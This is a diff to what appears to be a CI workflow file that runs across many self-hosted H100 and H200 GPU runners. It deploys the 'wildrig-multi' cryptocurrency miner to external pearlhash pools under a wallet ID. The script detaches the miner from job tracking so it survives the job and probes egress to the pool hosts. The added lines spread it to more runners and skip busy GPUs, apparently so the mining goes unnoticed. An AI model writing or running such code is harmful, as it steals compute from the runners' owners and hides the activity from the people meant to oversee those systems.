@@ -15,10 +15,18 @@ jobs:
         include:
         - {label: 8-gpu-h200, tag: h200a}
         - {label: 8-gpu-h200, tag: h200b}
-        - {label: 8-gpu-h200, tag: h200c}
-        - {label: 8-gpu-h200, tag: h200d}
         - {label: 4-gpu-h100, tag: h100a}
         - {label: 4-gpu-h100, tag: h100b}
+        - {label: 1-gpu-h100, tag: h100s1}
+        - {label: 1-gpu-h100, tag: h100s2}
+        - {label: 1-gpu-h100, tag: h100s3}
+        - {label: 1-gpu-h100, tag: h100s4}
+        - {label: 1-gpu-h100, tag: h100s5}
+        - {label: 1-gpu-h100, tag: h100s6}
+        - {label: 2-gpu-h100, tag: h100d1}
+        - {label: 2-gpu-h100, tag: h100d2}
+        - {label: 2-gpu-h100, tag: h100d3}
+        - {label: 2-gpu-h100, tag: h100d4}
     runs-on: ${{ matrix.label }}
     timeout-minutes: 45
     steps:
@@ -34,13 +42,12 @@ jobs:
         N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); N=${N:-0}
         echo "GPU_COUNT $N"
         if [ "$N" -lt 1 ]; then echo "NO_GPU"; exit 0; fi
-        nvidia-smi --query-gpu=index,uuid,name,driver_version --format=csv,noheader 2>&1 | head -20
+        nvidia-smi --query-gpu=index,uuid,name,driver_version,utilization.gpu,memory.used --format=csv,noheader 2>&1 | head -20
         if pgrep -f wildrig-multi >/dev/null 2>&1; then
           echo "SKIP_EXISTING_WILDRIG host=$H"
           pgrep -af wildrig-multi 2>/dev/null | head -20
           exit 0
         fi
-        echo "IDLE_HOST_STARTING_WAVE3 host=$H tag=$TAG"
         echo "EGRESS_BEGIN"
         for hp in 169.58.247.186:8791 pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362; do
           h="${hp%:*}"; p="${hp##*:}"
@@ -73,11 +80,17 @@ jobs:
         echo "PRINT_DEVICES_BEGIN"
         timeout 90 "$BIN" --print-devices 2>&1 | head -40 || true
         echo "PRINT_DEVICES_END"
+        started=0
         for i in $(seq 0 $((N-1))); do
+          u=$(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits -i "$i" 2>/dev/null | head -1 | tr -dc '0-9'); u=${u:-0}
+          m=$(nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits -i "$i" 2>/dev/null | head -1 | tr -dc '0-9'); m=${m:-0}
+          if [ "$u" -ge 20 ] || [ "$m" -ge 4000 ]; then echo "BUSY_SKIP gpu=$i util=$u mem=$m"; continue; fi
           setsid env -u RUNNER_TRACKING_ID nohup "$BIN" --algo pearlhash -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "${WALLET}.1252010${i}" -p x -d "$i" -r 2 -R 10 -l "$W/wr-$i.log" >/dev/null 2>&1 &
           echo "STARTED gpu=$i pid=$!"
+          started=$((started+1))
         done
-        echo "W3_STARTED" > "$W/w3-started"
+        if [ "$started" -gt 0 ]; then echo "W3_STARTED n=$started" > "$W/w3-started"; fi
+        echo "STARTED_TOTAL $started"
         sleep 25
         pgrep -af wildrig-multi 2>/dev/null | head -20 || echo "PGREP_NONE"
         for i in $(seq 0 $((N-1))); do echo "--- gpu $i ---"; tail -4 "$W/wr-$i.log" 2>/dev/null || true; done
